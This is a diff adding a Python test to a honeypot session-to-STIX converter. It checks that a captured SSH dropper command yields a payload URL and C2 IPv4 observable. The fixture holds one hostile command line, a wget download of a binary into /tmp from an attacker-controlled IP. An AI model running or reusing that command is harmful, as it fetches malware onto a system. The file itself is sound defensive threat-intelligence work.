@@ -143,3 +143,15 @@ def test_no_chain_edges_without_downloads(builder):
     objs = builder.build_cowrie_session(_session("Cowrie"))
     # nothing references a File since there are none
     assert all("file--" not in r.get("target_ref", "") for r in _rels(objs))
+
+
+def test_protocol_family_extracts_payload_url_and_c2(builder):
+    """SSH/protocol honeypots: a wget dropper in the command transcript yields
+    a URL observable + the C2 host IPv4 (the #2b SSH-payload IOC harvest)."""
+    s = _session("Beelzebub", commands=[
+        "cd /tmp;rm -f amd64;wget -t 1 http://195.177.94.72:3594/s/amd64"])
+    objs = builder.build_beelzebub_session(s)
+    urls = [o["value"] for o in objs if o["type"] == "url"]
+    ips = [o["value"] for o in objs if o["type"] == "ipv4-addr"]
+    assert "http://195.177.94.72:3594/s/amd64" in urls, "payload URL extracted"
+    assert "195.177.94.72" in ips, "C2 host IPv4 extracted from the URL"
